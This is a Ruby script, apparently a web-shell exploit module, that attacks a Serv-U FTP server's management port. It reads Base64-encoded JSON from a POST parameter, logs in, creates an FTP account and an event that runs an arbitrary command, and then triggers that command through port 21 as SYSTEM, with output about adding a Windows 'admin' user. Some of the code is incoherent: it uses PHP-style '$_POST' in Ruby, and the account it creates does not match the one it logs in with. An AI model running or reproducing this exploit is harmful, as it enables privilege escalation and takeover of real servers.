# $_POST: global variable

require 'net/http'
require 'socket'
require 'base64'
require 'json'

def main
  z1 = $_POST['z1'];

  unless z1
    print "[-] Invalid JSON / Base64."
    return
  end

  begin
    decoded_json = Base64.decode64(z1)
    config = JSON.parse(decoded_json)

    host = config["ip"] || "127.0.0.1"
    port = config["port"] ? config["port"].to_i : 43958
    user = config["user"] || ""
    pass = config["pass"] || ""
    cmd  = config["cmd"] || ""

    backdoor_user = "some_user"
    backdoor_pass = "some_pass"

    output = ""

    begin
      socket = TCPSocket.new(host, port)
      socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [5, 0].pack('l_2'))

      output += "[+] Successfully connected to Serv-U management port...\n"
      socket.gets

      socket.print("USER #{user}\r\n")
      socket.gets

      socket.print("PASS #{pass}\r\n")
      response = socket.gets

      if response.nil? || (!response.include?("230") && !response.include?("Logged in"))
        socket.close
        print "[-] Login failed: Default administrative password has been changed.\n"
        return
      end

      output += "[+] Successfully authenticated into Serv-U management interface!\n"

      socket.print("SUSER #{user}|#{pass}|Y|N\r\n")
      socket.gets

      socket.print("SEVENT #{user}|0|0|#{cmd}\r\n")
      socket.gets

      output += "[+] Malicious FTP account and Event trigger configured successfully.\n"
      socket.close
    rescue => e
      print "[-] Failed to connect to Serv-U management port. Reason: #{e.message}\n"
      return
    end

    output += "[+] Attempting to log into standard FTP port to trigger the SYSTEM payload...\n"
    begin
      ftp_socket = TCPSocket.new("127.0.0.1", 21)
      ftp_socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [3, 0].pack('l_2'))

      ftp_socket.gets
      ftp_socket.print("USER #{backdoor_user}\r\n")
      ftp_socket.gets

      ftp_socket.print("PASS #{backdoor_pass}\r\n")
      ftp_socket.gets

      ftp_socket.print("QUIT\r\n")
      ftp_socket.close

      output += "[+] Payload triggered! Verify if the Windows user 'admin' was added.\n"
    rescue => e
      output += "[-] Could not connect to port 21. The event will trigger whenever the account is accessed.\n"
    end

    print output

  rescue => e
    print "[-] Invalid JSON / Base64 or execution error: #{e.message}"
  end
end

main